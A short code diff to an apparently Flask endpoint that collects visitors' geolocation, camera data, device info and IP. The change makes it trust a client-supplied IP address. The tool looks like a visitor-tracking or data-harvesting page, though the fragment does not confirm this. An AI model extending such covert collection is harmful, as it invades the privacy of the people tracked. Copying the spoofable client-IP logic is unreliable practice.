@@ -34,7 +34,7 @@ def collect():
         camera = data.get('camera')
         user_agent = data.get('userAgent')
         device = data.get('deviceInfo')
-        ip = request.remote_addr
+        ip = data.get('ip') or request.remote_addr  # Use IP from client or fallback
 
         location_info = f"📍 Location: {latitude}, {longitude}" if latitude and longitude else "❌ Location Denied"
         info = f"""
